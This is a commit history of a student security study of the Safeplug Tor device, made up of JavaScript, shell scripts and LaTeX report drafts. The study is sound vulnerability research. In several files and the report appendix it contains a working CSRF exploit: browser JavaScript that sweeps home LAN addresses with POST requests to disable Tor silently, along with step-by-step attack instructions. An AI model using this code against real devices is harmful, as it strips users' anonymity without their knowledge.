-         console.log("Probably a thing.");
-          //document.write("Finding the IP address.\n<br>");
-          //delete req['onreadystatechange'];
-         /*var respo = req.responseText;
-         var hostinfo = respo.split("http://");
-         //document.write(hostinfo);
-         var ip = "0.0.0.0";
-         for (var i = 0; hostinfo.length >= i; i++) {
-            var ipend = hostinfo[i].search("/wpad");
-            if (ipend != -1)
-            {
-               ip = hostinfo[i].substring(0, ipend);
-               break;
-            }
-         }
-         if (ip == "0.0.0.0") {
-            document.write("Error finding ip!\n<br>");
-            return;
-         }
-         */
-         //     document.write("IP found: " + ip + "\n<br>");
-         var secondreq = new XMLHttpRequest();
-         //document.write("Stuff\n<br>");
-         try{
-         secondreq.open("GET", "http://www.yahoo.com", true);
-         secondreq.onreadystatechange = newcallb;
[…]

### 2014-01-23 public_html/index3.js

@@ -1,0 +1,54 @@
+function makemypostback(req) {
+   return function() {
+      console.log("Postback " + req.readyState);
+   };
+}
+
+function makemycallback(i, r) {
+   var myip = i;
+   var req = r;
+   function handlegetback() {
+      var rs = req.readyState;
+      //console.log("State is: " + rs);
+      // console.log(req);
+      console.log(myip + " " + rs);
+      console.log(req);
+      if (rs != 4) {
+         return;
+      }
+      console.log("Done " + myip);
+      //console.log(req.responseText);
+      if (req.status == 404) {
+         console.log("404\n");
+         return;
+      }
+      //console.log(req);
+      
+      console.log("Sending post: " + myip);
+      //delete req['onreadystatechange'];
+      
+      //var postreq = new XMLHttpRequest();
+      //postreq.open("POST", myip + "/svc/xspctrl/disableTor", true);
+      //postreq.timeout = 1000;
+      //postreq.onreadystatechange = makemypostback(postreq);
+      //postreq.send();   
+   }
+
+   return handlegetback;
+}
+
+function go() { 
+   var IP_SCANS = 3;
+   var reqs = new Array(IP_SCANS);
+   for (var i = 0; i <= IP_SCANS; i++)
+   {
+      var tryip = "http://192.168.0." + i;
+      reqs[i] = new XMLHttpRequest();
+      reqs[i].open("GET", tryip, true);
+      reqs[i].timeout = 2000 + i;
+      console.log(reqs[i].readyState);
+      reqs[i].onreadystatechange = makemycallback(tryip, reqs[i]);
+      console.log(reqs[i]);
+      reqs[i].send();
+   }
+}

### 2014-01-23 public_html/index4.js

@@ -1,0 +1,36 @@
+function go() { 
+   var IP_SCANS = 255;
+   var prefixes = new Array("http://192.168.0.", "http://192.168.1.");
+   //var prefix = "http://172.";
+   var prefix = "http://192."
+   var SECOND_START = 168;
+   var SECOND_END = 168;
+   var THIRD_START = 0;
+   var THIRD_END = 1;
+   var mydate = new Date();
+   console.log(mydate.getTime());
+
+   for (var i = SECOND_START; i <= SECOND_END; i++) {
+      for (var j = THIRD_START; j <= THIRD_END; j++) {
+         for (var k = 0; k < IP_SCANS; k++) 
+         {
+            var tryip = prefix +  i + "." + j + "." + k;
+            var req = new XMLHttpRequest();
+            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
+            req.timeout = 1000;
+            //console.log(reqs[i].readyState);
+/*         req.onreadystatechange = function (ip) 
+           { 
+           return function() { console.log(ip); }
+           } (tryip); */
+            //console.log(reqs[i]);
+            req.send();
+         }
+         // COMMENT THIS OUT BEFORE RUNNING LARGE SCANS!
+         var mydate2 = new Date();
+         console.log(mydate2.getTime() + " " + j);
+      }
+      var mydate = new Date();
+      console.log(mydate.getTime() + " " + i);
+   }
+}

### 2014-01-23 tcpdump.sh

@@ -1,0 +1,4 @@
+# Internal
+sudo tcpdump -i eth1 -e -w -tt
+# Exeternal
+sudo tcpdump -i eth0 

### 2014-01-24 report/results.tex
reorganize

--- 2014-01-14 results.tex
@@
 
-\subsubsection{Internet Use}
+\subsection{Internet Use}
 \label{inetuse}
-{\bf Setting up Safeplug.} The first step was to plug Safeplug into our router and activate our device.
+
+\subsubsection{Setting up Safeplug} The first step was to plug Safeplug into our router and activate our device.
 Our instructions are shown in Figure~\ref{fig:instructions}.
@@
 
-{\bf Using the Internet.} Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
+\subsubsection{Using the Internet} Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
 Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.
@@
 
-{\bf Cookies.}  While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.
+\subsubsection{Cookies}  While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.
 When we clicked on the Google+ logo, it remember who we are; so we can confirm that we still have first-party cookies.

### 2014-01-24 report/resultsSoftware.tex
reorganize

--- 2014-01-14 resultsSoftware.tex
@@
 \subsubsection{Website Attack}
-We think it is also possible that an external website could perform this attack by returning the correctly formatted POST string.  Setting this up is future work.
+It is also possible that an external website could perform this attack by returning a correctly formatted POST string.
+This executes the same functionality as the Insider Attack, but the attacker does not require any knowledge of the Safeplug device -- specifically the IP address.
+Any malicious Internet user with access to a web server can carry out this attack with less than 30 lines of Javascript code (See Appendix A).
+The following steps are necessary for the attack to be successful:
+
+\begin{enumerate}
+\item Set up a web page with the crafted Javascript code, including the POST request: http://$<$IP address$>$/svc/xspctrl/disableTor (See Appendix A).
+\item Send the malicious link to a user in the targeted private network.
+\item Once the user clicks the link and loads the malicious site, the correctly formatted POST request will be sent to every IP address in the  ranges.  
+\item Tor is disabled.  It should be noted that the user must refresh her settings page to see the modified settings.  
+\end{enumerate}
+
+This exploits the RPC server in the same manner that the Insider Attack does.
+While this attack requires a greater amount of time, the largest observed time to send requests to the 192.168.0.0/24 space was ~200 milliseconds; the entire attack costs ~400 milliseconds for sending request to both 192.168.0.0/24 and 192.168.1.0/24 ranges.
+In the case of a private network in the range of 10.0.0.0/16, the attack took ~12 minutes.
+The 10.0.0.0/16 range is more commonly used for business networks, whereas the other ranges are more common in home networks; because Safeplug is geared towards home network use, we conclude that ~400 milliseconds is a reasonable amount of time for the attacker to spend.
+
+In addition to disabling Tor, the attacker can modify any other settings on the device.
+This includes: enabling/disabling Tor, enabling/disabling ad-blocking, enabling/disabling the use of the device as a Tor relay node [note: this requires the user to do additional setup].
+It is also interesting to note that the source code for the configurations includes the ability to use the device as a Tor exit node; therefore, the attacker can enable/disable this functionality as long as the user has already set up the device as a Tor relay node.
+Lastly, the attacker can also modify the user's whitelist of sites that should not be routed through Tor.

### 2014-01-24 nat-fw.sh

@@ -1,315 +1,0 @@
-#!/bin/sh
-#
-#firewall-iptables
-FWVER= 0.76
-#
-#               Initial SIMPLE IP Masquerade test for 2.6 / 2.4 kernels
-#               using IPTABLES.
-#
-#               Once IP Masquerading has been tested, with this simple
-#               ruleset, it is highly recommended to use a stronger
-#               IPTABLES ruleset either given later in this HOWTO or
-#               from another reputable resource.
-#
-#
-#
-# Log:
-#       0.76 - Added comments on why the default policy is ACCEPT
-#       0.75 - Added more kernel modules to the comments section 
-#       0.74 - the ruleset now uses modprobe vs. insmod
-#       0.73 - REJECT is not a legal policy yet; back to DROP
-#       0.72 - Changed the default block behavior to REJECT not DROP
-#       0.71 - Added clarification that PPPoE users need to use 
-#              "ppp0" instead of "eth0" for their external interface
-#       0.70 - Added commented option for IRC nat module
-#            - Added additional use of environment variables
-#            - Added additional formatting 
-#       0.63 - Added support for the IRC IPTABLES module
-#       0.62 - Fixed a typo on the MASQ enable line that used eth0
-#              instead of $EXTIF
-#       0.61 - Changed the firewall to use variables for the internal 
-#              and external interfaces.
-#       0.60 - 0.50 had a mistake where the ruleset had a rule to DROP
-#              all forwarded packets but it didn't have a rule to ACCEPT
-#              any packets to be forwarded either
-#            - Load the ip_nat_ftp and ip_conntrack_ftp modules by default
-#       0.50 - Initial draft
-#
-
-echo -e "\n\nLoading simple rc.firewall-iptables version $FWVER..\n"
-
-
-# The location of the iptables and kernel module programs 
-#
-#   If your Linux distribution came with a copy of iptables,
-#   most likely all the programs will be located in /sbin.  If
-#   you manually compiled iptables, the default location will
-#   be in /usr/local/sbin 
-#
-# ** Please use the "whereis iptables" command to figure out
-# ** where your copy is and change the path below to reflect
-# ** your setup
-#
-IPTABLES=/sbin/iptables
-#IPTABLES=/usr/local/sbin/iptables 
-DEPMOD=/sbin/depmod
-MODPROBE=/sbin/modprobe
-
-
[…]

### 2014-01-24 nat.sh

@@ -1,52 +1,0 @@
-echo -e "\n\nLoading simple rc.firewall-iptables version $FWVER..\n"
-DEPMOD=/sbin/depmod
-MODPROBE=/sbin/modprobe
-
-EXTIF="eth0"
-INTIF="eth1"
-#INTIF2="eth0"
-echo "   External Interface:  $EXTIF"
-echo "   Internal Interface:  $INTIF"
-
-#======================================================================
-#== No editing beyond this line is required for initial MASQ testing == 
-echo -en "   loading modules: "
-echo "  - Verifying that all kernel modules are ok"
-$DEPMOD -a
-echo "----------------------------------------------------------------------"
-echo -en "ip_tables, "
-$MODPROBE ip_tables
-echo -en "nf_conntrack, " 
-$MODPROBE nf_conntrack
-echo -en "nf_conntrack_ftp, " 
-$MODPROBE nf_conntrack_ftp
-echo -en "nf_conntrack_irc, " 
-$MODPROBE nf_conntrack_irc
-echo -en "iptable_nat, "
-$MODPROBE iptable_nat
-echo -en "nf_nat_ftp, "
-$MODPROBE nf_nat_ftp
-echo "----------------------------------------------------------------------"
-echo -e "   Done loading modules.\n"
-echo "   Enabling forwarding.."
-echo "1" > /proc/sys/net/ipv4/ip_forward
-echo "   Enabling DynamicAddr.."
-echo "1" > /proc/sys/net/ipv4/ip_dynaddr 
-echo "   Clearing any existing rules and setting default policy.."
-
-iptables-restore <<EOF
--EOF
-*nat
--A POSTROUTING -o "$EXTIF" -j MASQUERADE
-COMMIT
-*filter
-:INPUT ACCEPT [0:0]
-:FORWARD DROP [0:0]
-:OUTPUT ACCEPT [0:0]
--A FORWARD -i "$EXTIF" -o "$INTIF" -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 
--A FORWARD -i "$INTIF" -o "$EXTIF" -j ACCEPT
--A FORWARD -j LOG
-COMMIT
-EOF
-
-echo -e "\nrc.firewall-iptables v$FWVER done.\n"

### 2014-01-24 send_post_request_script.py

@@ -1,12 +1,0 @@
-import httplib
-import urllib
-
-#params = urllib.urlencode({'@number': 12524, '@type': 'issue', '@action': 'show'})
-headers = {"Content-type": "application/x-www-form-urlencoded",
-            "Accept": "text/plain"}
-conn = httplib.HTTPConnection("bugs.python.org") # put IP address here
-#conn.request("POST", "", params, headers)
-conn.request("POST", "", "", headers)
-response = conn.getresponse()
-data = response.read()
-conn.close()

### 2014-01-24 report/report.tex
reorganize
appendix and cookies

--- 2014-01-14 report.tex
@@
 \usepackage{listings}
+\usepackage{listings}
+\usepackage{color}
 \lstnewenvironment{fileName}{%
@@
 
-Anna Kornfeld Simpson and Annie Edmunson
+Anna Kornfeld Simpson and Annie Edmundson
 
@@
 
+\newpage
+\appendix
+\section{\\Javascript for Website Attack} \label{App:AppendixA}
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+
+\lstset{frame=tb,
+  language=Java,
+  aboveskip=3mm,
+  belowskip=3mm,
+  showstringspaces=false,
+  columns=flexible,
+  basicstyle={\small\ttfamily},
+  numbers=none,
+  numberstyle=\tiny\color{gray},
+  keywordstyle=\color{blue},
+  commentstyle=\color{dkgreen},
+  stringstyle=\color{mauve},
+  breaklines=true,
+  breakatwhitespace=true
+  tabsize=3
+}
+
+\begin{lstlisting}
+function go() { 
+   var IP_SCANS = 255;
+   var prefixes = new Array("http://192.168.0.", "http://192.168.1.");
+   //var prefix = "http://172.";
+   var prefix = "http://192."
+   var SECOND_START = 168;
+   var SECOND_END = 168;
+   var THIRD_START = 0;
+   var THIRD_END = 1;
+   var mydate = new Date();
+   console.log(mydate.getTime());
+
+   for (var i = SECOND_START; i <= SECOND_END; i++) {
+      for (var j = THIRD_START; j <= THIRD_END; j++) {
+         for (var k = 0; k < IP_SCANS; k++) 
+         {
+            var tryip = prefix +  i + "." + j + "." + k;
+            var req = new XMLHttpRequest();
+            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
+            req.timeout = 1000;
+            //console.log(reqs[i].readyState);
+/*         req.onreadystatechange = function (ip) 
+           { 
+           return function() { console.log(ip); }
+           } (tryip); */
+            //console.log(reqs[i]);
+            req.send();
+         }
+         // COMMENT THIS OUT BEFORE RUNNING LARGE SCANS!
+         var mydate2 = new Date();
+         console.log(mydate2.getTime() + " " + j);
+      }
+      var mydate = new Date();
+      console.log(mydate.getTime() + " " + i);
+   }
+}
+\end{lstlisting}
+
 \end{document}

### 2014-01-24 report/results.tex
appendix and cookies

@@
 It requires a trip to the browser settings to clear cookies (or not have them set in the first place).
-We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}, and future work will include an analysis of this data, particularly looking for third-party cookies.
+We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}.
+When collecting data on the existence of third-party cookies, we analyzed two separate browsing sessions; they were both new sessions with no cookies.
+One of the sessions used the ad-block feature of the Safeplug and the other did not.
+After analyzing data from Fourthparty, we found many third-party cookies in both sessions.
+These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
 

### 2014-01-24 report/report.tex
small edits

--- 2014-01-14 report.tex
@@
 
+\newpage
+\appendix
+\section{\\Javascript for Website Attack} \label{App:AppendixA}
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+
+\lstset{frame=tb,
+  language=Java,
+  aboveskip=3mm,
+  belowskip=3mm,
+  showstringspaces=false,
+  columns=flexible,
+  basicstyle={\small\ttfamily},
+  numbers=none,
+  numberstyle=\tiny\color{gray},
+  keywordstyle=\color{blue},
+  commentstyle=\color{dkgreen},
+  stringstyle=\color{mauve},
+  breaklines=true,
+  breakatwhitespace=true
+  tabsize=3
+}
+
+\begin{lstlisting}
+function go() { 
+   var IP_SCANS = 255;
+   var prefix = "http://192."
+   var SECOND_START = 168;
+   var SECOND_END = 168;
+   var THIRD_START = 0;
+   var THIRD_END = 1;
+   var mydate = new Date();
+   console.log(mydate.getTime());
+
+   for (var i = SECOND_START; i <= SECOND_END; i++) {
+      for (var j = THIRD_START; j <= THIRD_END; j++) {
+         for (var k = 0; k < IP_SCANS; k++) 
+         {
+            var tryip = prefix +  i + "." + j + "." + k;
+            var req = new XMLHttpRequest();
+            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
+            req.timeout = 1000;
+            req.send();
+         }
+         // COMMENT THIS OUT BEFORE RUNNING LARGE SCANS!
+         var mydate2 = new Date();
+         console.log(mydate2.getTime() + " " + j);
+      }
+      var mydate = new Date();
+      console.log(mydate.getTime() + " " + i);
+   }
+}
+\end{lstlisting}
+
 \end{document}

### 2014-01-27 report/design.tex
reorganized paper and added sections according to diebold paper

\section{Design and Operation of Safeplug}
\label{sec:design}

### 2014-01-27 report/implementattacks.tex
reorganized paper and added sections according to diebold paper

\section{Implementing Attacks}
\label{sec:implementattacks}

### 2014-01-27 report/abstract.tex
added TODO items in paper

\section{Abstract}
\label{sec:abstract}

TODO: Annie

### 2014-01-27 report/usability.tex
added TODO items in paper

\section{Usability}
\label{sec:usability}

TODO: Annie

### 2014-02-04 report/implementattacks.tex
added TODO items in paper
added CSRF attack and usability

@@
 \label{sec:implementattacks}
+
+\subsection{Gaining Access through SSH}
+
+\subsection{Insider Attack}
+
+\subsection{CSRF Attack}
+An external website can also perform this attack by returning a correctly formatted POST string.
+This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.
+Instead, the attacker (who could be any malicious actor with access to a web server) can just send a POST request to every IP in the common ranges of local addresses in home networks, 192.168.0.0/24 and 192.168.1.0/24.
+We implemented this attack with less than 30 lines of Javascript code (See Appendix A).
+The following steps are necessary for the attack to be successful:
+
+\begin{enumerate}
+\item Set up a web page with the crafted Javascript code, which will send a POST request of the following format to all addresses in the range: http://$<$IP address$>$/svc/xspctrl/disableTor (See Appendix A).
+\item Send the malicious link to a user in the targeted private network.
+\item Once the user clicks the link and loads the malicious site, the correctly formatted POST request will be sent to every IP address in the ranges.  
+\item Tor is disabled silently.  The user must check or refresh her settings page to learn that Tor is turned off.  
+\end{enumerate}
+
+This exploits the RPC server in the same manner that the Insider Attack does.
+While this attack requires a greater amount of time because the local IP address of the Safeplug must be guessed via search, but the number of private address spaces is small, and the space likely to be occupied by a Safeplug on a home network is even smaller.
+
+The largest observed time to send requests to the 192.168.0.0/24 space was ~400 milliseconds; the entire attack costs ~800 milliseconds for sending request to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.
+In the case of a private network in the range of 172.16.0.0/16, the attack took less than ~12 minutes (this generates script timeout warnings in most major browsers, which affects the timing of this attack).
+This means that it would take a few hours to send requests to the full 172.16.0.0/12 range, which is commonly used in business networks.
+The final private network space is 10.0.0.0/8 which is too large for an exhaustive search, but some simple optimization might make it feasible as well.
+For example, using a GET request to get and parse the Safeplug settings page would allow the script to positively identify the safeplug and stop the search.
+However, the 192.168.0.0/24 and 192.168.1.0/24 ranges are much more common in home networks; because Safeplug is geared towards home network use, in most cases the script will take less than a second, a trivial amount of time for the attacker to spend.
+
+In addition to disabling Tor, the attacker can modify any other settings on the device.
+This includes: enabling/disabling Tor, enabling/disabling ad-blocking, enabling/disabling the use of the device as a Tor relay node [note: this requires the user to do additional setup], enabling/disabling the use of the device as an exit node (if it is already a relay).
+Lastly, the attacker can also modify the user's whitelist of sites that should not be routed through Tor.
+This whitelist attack is particularly dangerous because the change is silent and much harder for the user to notice the addition of a single website to the whitelist than a global loss of Tor.
+(Removal of a webpage from the whitelist is likely to to cause usability problems and be more evident.)

### 2014-02-04 report/usability.tex
added CSRF attack and usability

@@
 
-TODO: Annie
+Before setting up and using the Safeplug device, we read a variety of news articles as well as opinions through the Tor mailing list~\cite{tormailinglist}.
+There were many thoughts on the Terms of Service and the option to use the device as a Tor relay node; this inspired us to start our analysis with these items.
+
+\subsection{Terms of Service}
+\label{tos}
+Safeplug's Terms of Service are interesting because they are controlling, yet the product they are for is a device for anonymization.
+The first section of the Terms of Service explains how to agree to them:
+
+\begin{quotation}
+``You must agree to these TOS before you can use the Service.
+You can agree to these TOS by: a) actually using the Service, or b) clicking a box that indicates you agree to the Service, where such a box is made available to you.'' \cite{safeplug}
+\end{quotation}
+
+This is worth noting because option b) described above did not exist in any part of the setup process for Safeplug.
+The Terms of Service continues by notifying readers that Pogoplug can change them any time they wish:
+
+\begin{quotation}
+``Pogoplug may update or change these TOS from time to time and recommends that you review the TOS on a regular basis at www.pogoplug.com/safeplug.
+You understand and agree that your continued use of the Service after the TOS has changed constitutes your acceptance of the TOS as revised.
+'' \cite{safeplug}
+\end{quotation}
+
+Most Safeplug users will likely not read the Terms of Service once, let alone on a regular basis; therefore, most users will be blind to any changes.
+It is also interesting that these Terms of Service are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the Terms of Service, in the package that the device was shipped in.
+Further along in the Terms of Service, the makers of Safeplug were sloppy when they wrote:
+
+\begin{quotation}
+``Pogoplug includes several open source components in the Software.
+You agree to abide by the terms of the relevant licenses, as may be updated by Pogoplug from time to time at http://pogoplug.com/home-en-developers-open-source.html.
+'' \cite{safeplug}
+\end{quotation}
+
+The link included is a dead link and takes the user to a web page with a 404 error.
+This lack of attention to detail or respect for open source licenses does not put Pogoplug in a good light.
+In fact, the Tor mailing list noted this particularly, since Tor is an open source project \cite{tormailinglist}.
+The last section of the Terms of Service that stood out described Pogoplug's policy on updates:
+
+\begin{quotation}
+``As part of the Service, you may from time to time receive updates to the Software from Pogoplug that may be automatically downloaded and installed to your applicable device.
+These updates may include bug fixes, security enhancements or improvements, or entirely new versions of the Software.
+You agree that Pogoplug may automatically deliver such updates to you as part of the Service.
+'' \cite{safeplug}
+\end{quotation}
+
+This should raise a red flag for users because they may not know when the software in their device is being changed or what it is changing to.
+While Safeplug makes many claims about providing anonymity, users are simply putting their trust in a different entity, namely Pogoplug.
+
+\subsection{Tor Relay Node Option}
+One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially setup, the default setting is to not use it as a relay node.
+
+One of our concerns is how understandable this setting is to the average Internet user.
+The settings page describes Tor in an extremely basic way, as shown in Figure~\ref{fig:funnydesc}, but describes the functionality of a Tor relay node in a much more technical manner.
+This description is shown in Figure~\ref{fig:relaydesc}.
+If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
+This could be a problem if users simply decide not to do anything with that setting (i.e.
+don't change the setting to use Safeplug as a relay node).
+Then there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
+
+\begin{figure}[th]
+\begin{center}
+\includegraphics[width=\textwidth]{funnydesc.png}
+\caption{Description of Tor on Safeplug settings page.}
+\label{fig:funnydesc}
+\end{center}
+\end{figure}
+
+\begin{figure}[th]
+\begin{center}
+\includegraphics[width=\textwidth]{relaydesc.png}
+\caption{Description of a Tor relay on Safeplug settings page.}
+\label{fig:relaydesc}
+\end{center}
+\end{figure}
+
+This could easily be remedied; Safeplug should choose a target audience and have consistent descriptions.
+The best option is to explain the Tor network and the functionality of a Tor relay node at the same level, preferably a level that normal Internet users can understand.
+This increases the chances that users will run their Safeplug as a relay node.
+
+\subsection{Internet Use}
+\label{inetuse}
+
+\subsubsection{Setting up Safeplug} The first step was to plug Safeplug into our router and activate our device.
+Our instructions are shown in Figure~\ref{fig:instructions}.
+We followed them, activated our device, and then ended on the configuration page.
+The configuration page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
+It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.
+Figure~\ref{fig:proxyconfig} shows our configuration.
+
+\begin{figure}[t]
+\begin{center}
+\includegraphics[width=.75\textwidth]{instructions}
+\caption{Configuration instructions.}
+\label{fig:instructions}
+\end{center}
+\end{figure}
+
+\begin{figure}[t]
+\begin{center}
+\includegraphics[width=.75\textwidth]{proxyconfig}
+\caption{Proxy Configuration.}
+\label{fig:proxyconfig}
+\end{center}
+\end{figure}
+
+After we finished our configuration, we were taken to our settings.
+This page is shown in Figure~\ref{fig:settings}.
+This allowed us to turn on/off Tor, add whitelisted websites, turn on/off ad-blocking, and turn on/off the ability of our device to be a relay node.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=.75\textwidth]{settings}
+\caption{Settings page.}
+\label{fig:settings}
+\end{center}
+\end{figure}
+
+\subsubsection{Using the Internet} Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
+Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.
+
+\begin{figure}[htb]
+\centering
+\begin{subfigure}[b]{.4\textwidth}
+\includegraphics[width=\textwidth]{before}
+\caption{Web page before using Tor and ad-blocking.}
+\label{fig:before}
+\end{subfigure}%
+\quad
+\begin{subfigure}[b]{.4\textwidth}
+\includegraphics[width=\textwidth]{after}
+\caption{Web page after using Tor and ad-blocking.}
+\label{fig:after}
+\end{subfigure}
+\end{figure}
+
+Next, we wanted to see how usable this would be to a normal Internet user.
+A user would probably decide not to use Safeplug if they couldn't read their web pages (if they weren't in their native language), or if they couldn't log into their accounts (some web sites will lock a user out if they try to login from multiple countries in a short time period).
+While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, then they may just get frustrated and stop using Safeplug altogether.
+We were also prompted with the page in Figure~\ref{fig:funnygoogle} when we tried to log into our Google account.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=0.5\textwidth]{funnygoogle}
+\caption{Google's response after trying to log in.}
+\label{fig:funnygoogle}
+\end{center}
+\end{figure}
+
+\subsection{Cookies}  While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.
+When we clicked on the Google+ logo, it remember who we are; so we can confirm that we still have first-party cookies.
+We experienced the same situation with Facebook and its corresponding ``like'' button.
+
+This is clearly not the perfect ``anonymity'' that Safeplug promised in their publicity.
+Although normal use does follow this model of persisting logins across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (German vs Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.
+
+More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.
+It requires a trip to the browser settings to clear cookies (or not have them set in the first place).
+We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}.
+When collecting data on the existence of third-party cookies, we analyzed two separate browsing sessions; they were both new sessions with no cookies.
+One of the sessions used the ad-block feature of the Safeplug and the other did not.
+After analyzing data from Fourthparty, we found many third-party cookies in both sessions.
+These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.

### 2014-02-04 report/discussion.tex
ideas for discussion section

\section{Discussion}
\label{sec:discussion}

-does this device have a real market/purpose?

-did not test on mobile devices

### 2014-02-05 report/implementattacks.tex
Typos and removal of honor code.

@@
 \begin{enumerate}
-\item Set up a web page with the crafted Javascript code, which will send a POST request of the following format to all addresses in the range: http://$<$IP address$>$/svc/xspctrl/disableTor (See Appendix A).
+\item Set up a web page with the crafted Javascript code, which will send a POST request of the following format to all addresses in the range: \url{http://<IP address>/svc/xspctrl/disableTor} (See Appendix A).
 \item Send the malicious link to a user in the targeted private network.

### 2014-02-05 report/report.tex
reorganized paper and added sections according to diebold paper
Typos and removal of honor code.

--- 2014-01-14 report.tex
@@
 
+\input{abstract}
+
 \input{intro}
-\input{goals}
-\input{procedure}
-\input{results}
-\input{resultsSoftware}
+\input{design}
+\input{usability}
+%\input{results}
+%\input{resultsSoftware}
+\input{implementattacks}
+\input{discussion}
 \input{related}
@@
 \section{Acknowledgements}
-We would like to express our gratitude to Josh Kroll for donating a lot of time and his computer to the routing effort.  We also thank whoever left the very nice set of screwdrivers on our desks!
-
-This paper represents our own work in accordance with University regulations.
-
-Anna Kornfeld Simpson and Annie Edmunson
+We would like to express our gratitude to Ed Felten for helping us procure the Safeplugs and to Josh Kroll for donating a lot of time and his computer to the routing effort.
+We also thank whoever left the very nice set of screwdrivers on our desks!
 
@@
 
+\newpage
+\appendix
+\section{\\Javascript for Website Attack} \label{App:AppendixA}
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+
+\lstset{frame=tb,
+  language=Java,
+  aboveskip=3mm,
+  belowskip=3mm,
+  showstringspaces=false,
+  columns=flexible,
+  basicstyle={\small\ttfamily},
+  numbers=none,
+  numberstyle=\tiny\color{gray},
+  keywordstyle=\color{blue},
+  commentstyle=\color{dkgreen},
+  stringstyle=\color{mauve},
+  breaklines=true,
+  breakatwhitespace=true
+  tabsize=3
+}
+
+\begin{lstlisting}
+function go() { 
+   var IP_SCANS = 255;
+   var prefix = "http://192."
+   var SECOND_START = 168;
+   var SECOND_END = 168;
+   var THIRD_START = 0;
+   var THIRD_END = 1;
+
+   for (var i = SECOND_START; i <= SECOND_END; i++) {
+      for (var j = THIRD_START; j <= THIRD_END; j++) {
+         for (var k = 0; k < IP_SCANS; k++) 
+         {
+            var tryip = prefix +  i + "." + j + "." + k;
+            var req = new XMLHttpRequest();
+            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
+            req.timeout = 1000;
+            req.send();
+         }
+      }
+   }
+}
+\end{lstlisting}
+
 \end{document}

### 2014-02-07 report/bibliography.tex
Typos and removal of honor code.
Discussion section and import from old report to new.

--- 2014-01-14 bibliography.tex
@@
 nal/world/catalog-reveals-nsa-has-back-doors-for-numerous-devices-a-940994.html}
+
+\bibitem{nsa} Arther, Charles.  ``NSA scandal: what data is being monitored and how does it work?'' \url{http://www.theguardian.com/world/2013/jun/07/nsa-prism-records-surveillance-questions}.
 
@@
 
+\bibitem{amorbot} The Tor Project. ``Orbot: Proxy with Tor.'' \emph{Google Android Market}. Accessed 7 February 2014, \url{https://play.google.com/store/apps/details?id=org.torproject.android}
+
 \bibitem{bittech} Halfacree, Gareth. ``Pogoplug launches Tor-powered Safeplug'' \emph{bit-tech.net} 25 November 2013, \url{http://www.bit-tech.net/news/hardware/2013/11/25/pogoplug-safeplug/1}.
@@
 ``Users get routed: Traffic correlation on Tor by realistic adversaries.'' \emph{Proceedings of the 2013 ACM SIGSAC conference on Computer \& Communications Security (CCS)}, 2013.
+
+\bibitem{dropbear} Johnston, Matt. ``Dropbear SSH.'' \url{https://matt.ucc.asn.au/dropbear/dropbear.html}
 
@@
 
+\bibitem{orbot} ``Tor on Android.'' \emph{Tor Project.} Accessed February 2014. \url{https://torproject.org/docs/android.html.en}
+
+\bibitem{pano} Panopticlick. \url{https://panopticlick.eff.org/}.
+
 \bibitem{safeplug} Pogoplug. ``Safeplug'', \url{https://pogoplug.com/safeplug}.
@@
 
+\bibitem{torproject} Tor Project.  \url{https://www.torproject.org/}.
+
 \bibitem{wireshark} Wireshark, \url{http://www.wireshark.org/}.

### 2014-02-07 report/design.tex
added TODO items in paper
Discussion section and import from old report to new.

@@
 \label{sec:design}
+
+\subsection{Hardware}
+We opened up the Safeplug device to look at the internals.
+Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
+We identified an SD card slot, Lan transformer, and Ethernet transceiver on the top of the board.
+On the bottom, we found flash memory and the integrated circuit.
+
